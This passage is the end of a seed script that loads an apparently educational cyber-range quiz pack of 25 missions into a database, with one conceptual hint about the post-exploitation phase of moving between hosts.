          "Two-word answer: the post-exploitation phase of moving between internal hosts."
        ],
        xp: 500
      }
    ]
  });

  console.log("Nexus Cyber Range Pack 001 seeded (25 missions)");
}

async function main() {
  await seedCyberRangePack001();
}

runSeedIfMain("cyberRangePack001", main);
